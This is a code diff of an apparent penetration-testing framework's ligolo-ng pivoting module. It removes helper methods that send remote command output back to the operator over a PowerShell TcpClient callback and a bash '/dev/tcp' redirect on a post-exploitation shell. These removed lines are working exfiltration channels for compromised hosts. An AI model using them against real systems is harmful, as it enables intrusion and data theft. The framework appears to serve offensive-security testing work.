@@ -9,12 +9,10 @@ import tarfile
 import threading
 import time
 import urllib.request
-import uuid
 import zipfile
 
 from koi.modules.blueprint import KoiModule
 
-_PS_PROMPT  = re.compile(r'^PS\s+\S+>\s*')
 _GITHUB_API = "https://api.github.com/repos/nicocha30/ligolo-ng/releases/latest"
 
 _ARCH_MAP = {
@@ -43,106 +41,6 @@ class LigoloModule(KoiModule):
             "help":    "Remote destination path for the agent binary",
         },
     ]
-
-    def _get_local_ip(self) -> str:
-        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        try:
-            s.connect((self.session.addr[0], 80))
-            return s.getsockname()[0]
-        finally:
-            s.close()
-
-    def _win_query(self, ps_expr: str, timeout: float = 15.0) -> str:
-        if self.session.upgraded:
-            return self._win_query_sidechannel(ps_expr, timeout)
-
-        sentinel = uuid.uuid4().hex
-        marker   = f"__KOI_{sentinel}__"
-        cmd      = f"({ps_expr}); '{marker}'"
-        eol      = self.session.eol
-        enc      = self.session.encoding
-        self.session.conn.sendall((cmd + eol).encode(enc))
-
-        buf      = b""
-        deadline = time.monotonic() + timeout
-        lines: list[str] = []
-
-        while True:
-            remaining = deadline - time.monotonic()
-            if remaining <= 0:
-                break
-            r, _, _ = select.select([self.session.conn], [], [], min(remaining, 0.1))
-            if not r:
-                continue
-            chunk = self.session.conn.recv(4096)
-            if not chunk:
-                break
-            buf += chunk
-            while b"\n" in buf:
-                raw, buf = buf.split(b"\n", 1)
-                text = raw.decode(enc, errors="replace").strip("\r\n ")
-                text = _PS_PROMPT.sub("", text).strip()
-                if not text or "Write-Host" in text:
-                    continue
-                if marker in text:
-                    return lines[-1] if lines else ""
-                lines.append(text)
-
-        return lines[-1] if lines else ""
-
-    def _win_query_sidechannel(self, ps_expr: str, timeout: float = 15.0) -> str:
-        local_ip = self._get_local_ip()
-        srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-        srv.bind(("0.0.0.0", 0))
-        srv.listen(1)
-        srv.settimeout(timeout)
-        port = srv.getsockname()[1]
-
-        ps_cmd = (
-            f"$_r=({ps_expr})|Out-String;"
-            f"$_c=New-Object Net.Sockets.TcpClient('{local_ip}',{port});"
-            f"$_s=$_c.GetStream();"
-            f"$_b=[Text.Encoding]::UTF8.GetBytes($_r.Trim());"
-            f"$_s.Write($_b,0,$_b.Length);"
-            f"$_s.Flush();$_c.Close()"
-        )
-        self.session.conn.sendall((ps_cmd + "\r\n").encode(self.session.encoding))
-
-        try:
-            conn, _ = srv.accept()
-            data = b""
-            while chunk := conn.recv(4096):
-                data += chunk
-            conn.close()
-            return data.decode("utf-8", errors="replace").strip()
-        except socket.timeout:
-            return ""
-        finally:
-            srv.close()
-
-    def _exec_clean(self, cmd: str, timeout: float = 10.0) -> str:
-        local_ip = self._get_local_ip()
-        srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-        srv.bind(("0.0.0.0", 0))
-        srv.listen(1)
-        srv.settimeout(timeout)
-        port = srv.getsockname()[1]
-
-        self.exec(f"( {cmd} ) > /dev/tcp/{local_ip}/{port}", timeout=timeout)
-
-        try:
-            conn, _ = srv.accept()
-            data = b""
-            while chunk := conn.recv(4096):
-                data += chunk
-            conn.close()
-            return data.decode("utf-8", errors="replace").strip()
-        except socket.timeout:
-            return ""
-        finally:
-            srv.close()
 
     def _detect_arch(self) -> str:
         """Return the ligolo-ng architecture string for the remote target."""
